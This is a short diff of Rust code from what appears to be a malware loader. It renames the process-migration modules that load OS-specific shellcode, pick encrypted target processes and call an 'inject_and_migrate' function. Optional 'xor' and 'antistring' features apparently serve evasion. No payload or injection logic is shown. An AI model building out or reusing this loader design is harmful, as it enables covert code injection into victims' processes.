@@ -2,9 +2,9 @@ use std::str;
 
 // Load Linux implementation if the target OS is Linux
 #[cfg(target_os = "linux")]
-mod rco_process_migration_linux;
+mod process_migration_linux;
 #[cfg(target_os = "linux")]
-use rco_process_migration_linux::inject_and_migrate;
+use process_migration_linux::inject_and_migrate;
 // Determine which shellcode and target process to use based on features
 #[cfg(all(target_os = "linux", not(feature = "xor")))]
 const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
@@ -17,13 +17,13 @@ const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_LINUX_MIGRATION_TARGET;
 
 // Load Windows implementation if the target OS is Windows
 #[cfg(all(windows, not(feature = "antistring")))]
-mod rco_process_migration_windows;
+mod process_migration_windows;
 #[cfg(all(windows, not(feature = "antistring")))]
-use rco_process_migration_windows::inject_and_migrate;
+use process_migration_windows::inject_and_migrate;
 #[cfg(all(windows, feature = "antistring"))]
-mod rco_process_migration_windows_antistring;
+mod process_migration_windows_antistring;
 #[cfg(all(windows, feature = "antistring"))]
-use rco_process_migration_windows_antistring::inject_and_migrate;
+use process_migration_windows_antistring::inject_and_migrate;
 // Determine which shellcode and target process to use based on features
 #[cfg(all(windows, not(feature = "xor")))]
 const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
